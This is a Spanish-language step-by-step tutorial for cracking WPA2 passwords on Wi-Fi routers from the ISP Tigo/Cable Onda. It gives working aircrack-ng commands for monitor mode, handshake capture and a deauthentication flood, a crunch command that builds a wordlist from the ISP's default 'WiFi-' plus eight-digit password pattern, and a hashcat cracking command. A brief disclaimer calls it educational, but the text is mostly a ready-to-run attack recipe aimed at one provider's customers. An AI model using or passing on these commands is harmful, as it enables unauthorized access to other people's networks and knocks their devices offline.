# HACKING REDES TIGO

DISCLAIMER

Esta informacion no busca promover los ataques a redes que no sean de tu propiedad lo que se busca es tomarlo del punto educacional, que les ayude un poco a comprender como es un ataque de wireless y que nos ayude a protegernos.

# Procedimiento

https://www.youtube.com/watch?v=uczbN0nxKfI

Para este ataque utilizaremos la tecnica de captura de handshake y este archivo lo pasaremos al hashcat para poder desencriptar el hash a traves de un diccionario que crearemos con CRUNCH. 

Utilizaremos tres aplicaciones para poder obtener el password [Aircrack-ng](http://aircrack-ng.org/)/[Hashcat](http://hashcat.net/). Crunch https://github.com/jim3ma/crunch

## Comencemos

Para este tutorial necesitaremos cualquiera de estas distribuciones de linux:

-Kali Linux https://www.kali.org/)
-Parrot OS https://www.parrotsec.org/
-Wifislax https://www.wifislax.com/

# Hardware
	
- Necesitaremos una interfaz de red que sea compatible con [monitor mode](https://en.wikipedia.org/wiki/Monitor_mode)
- Pueden entrar a ese link y verificar que tarjetas de red son compatibles
- (http://www.wirelesshack.org/best-kali-linux-compatible-usb-adapter-dongles-2016.html)

### Monitor Mode

Lo primero que tenemos que hacer es colocar nuestra interfaz de red en modo monitor:

```bash
airmon-ng start "NUESTRA INTERFAZ"
```

Normalmente siempre lleva el nombre de `wlan0` pero para verificar cual es nombre solo escribe en una terminal `iwconfig`:

### Ahora nos ponemos en modo escucha

```bash
airodump-ng wlan0
```

- Veran algo similar como esto

```
CH 13 ][ Elapsed: 52 s ][ 2017-07-23 15:49                                         
                                                                                                                                              
 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
 14:91:82:F7:52:EB  -66      205       26    0   1  54e  WPA2             COWIFI241135420/9                                                 
```

- De esta ventana hay que anotar el bssid `14:91:82:F7:52:EB` y el canal `1`

### Poner en modo escucha el airodump

- Para esto solo tendremos que especificarle al airodump-ng en que red quiero que se enfoque y el nombre del archivo que quiero guardar toda esta informacion. con `-c` especificamos el canal `--bssid` insertamos el bssid y con `-w` nombramos el el archivo donde queremos que se almacene el handshake y por ultimo le especificamos nuestra interfaz de red.

```
airodump-ng -c 'CANAL' --bssid 'bssid' -w 'nombre del archivo' wlan0mon

```
```
 CH  6 ][ Elapsed: 1 min ][ 2017-07-23 16:09 ]                                        
                                                                                                                                              
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
                                                                                                                                              
14:91:82:F7:52:EB  -47   0      140        0    0   1  54e  WPA2 CCMP   PSK  COWIFI241135420/9  
```
-Ahora en otra terminal paralela a esta escribimos el siguente codigo
```
aireplay-ng --deauth 0 -a 'bssid' wlan0mon

```
-esto lo que hara es desautenticar a todos los disposivos y cuando se intente conectar capturaremos el handshake


-No pueden cerrar esta terminal hasta que en la parte superior derecha apareza este mensaje `[ WPA handshake: 14:91:82:F7:52:EB`.

- Luego cuando tengan este archivo '.cap' lo pasaremos a nuestro windows y entraremos a este link https://hashcat.net/cap2hashcat/ y comvertimos nuestro archivo .cap a .22000 que es el formato que lee hashcat.

# Creacion de diccionario

-Las redes tigo o cable onda tienen un particularidad y es que todas comienza con "WiFi-(y una serie de 8 numeros)" Con crunch podemos crear un diccionario especial para esto solo necesitaremos copiar estos comandos
```
crunch 13 13 -t WiFi-%%%%%%%% -o DiccionarioTIGO.txt

```

### Crack the Network Password

-Ahora en nuestro windows abriremos la consola y nos pocisionaremos donde tengamos descargado el hashcat luego cuando estemos adentro escribimos este codigo
```
hashcat -a 0 -m 22000 Nombre_del_hash.22000 diccionariotigo.txt --show

```

# LISTO

              
